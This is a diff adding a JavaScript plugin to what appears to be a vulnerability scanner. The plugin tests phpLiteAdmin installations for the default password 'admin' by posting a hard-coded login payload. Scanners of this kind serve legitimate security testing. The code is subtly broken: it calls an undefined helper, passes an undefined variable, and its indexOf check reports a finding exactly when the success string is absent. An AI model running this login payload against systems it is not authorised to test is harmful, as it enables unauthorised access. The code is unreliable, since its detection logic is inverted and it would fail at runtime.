@@ -1,0 +1,41 @@
+const { CoreLayer, createReport, browerHttpJob } = require('../core/core.js')
+const { extractBaseUrl } = require('../utils/urlparse.js')
+
+
+
+
+class phpLiteAdmin extends CoreLayer {
+    constructor(coreobj) {
+        super(coreobj);
+    }
+
+    async startTesting() {
+        console.log("开始phpLiteAdmin默认密码登录检测")
+        this.mainTab = await this.browser.newTab();
+        if (getFilenameFromUrl(this.url) == "phpliteadmin.php")
+            await this.attack(uri);
+        console.log("结束phpLiteAdmin默认密码登录检测")
+        this.mainTab.close();
+    }
+
+    async attack(uri) {
+        const payload = "PHPSESSID=9dc7f1c9a61525a49f80bbb433ba7deb&password=admin&remember=yes&login=Log+In&proc_login=true"
+        const lastJob = new browerHttpJob(this.mainTab)
+        lastJob.url = this.url
+        lastJob.method = this.method
+        lastJob.postData = payload
+        lastJob.isEncodeUrl = false
+        lastJob.addHeader("Content-Type", "application/x-www-form-urlencoded");
+        let response = await lastJob.execute();
+        response.body.forEach(element => {
+            if (element.indexOf("<b>Create New Database</b>")) {
+                console.log(`发现漏洞`);
+                const msg = { url: this.url, body: element, payload: payload, vuln: "rj-026-0001", level: "h" }
+                this.alert(createReport(msg));
+            }
+        });
+    }
+}
+
+
+module.exports = phpLiteAdmin
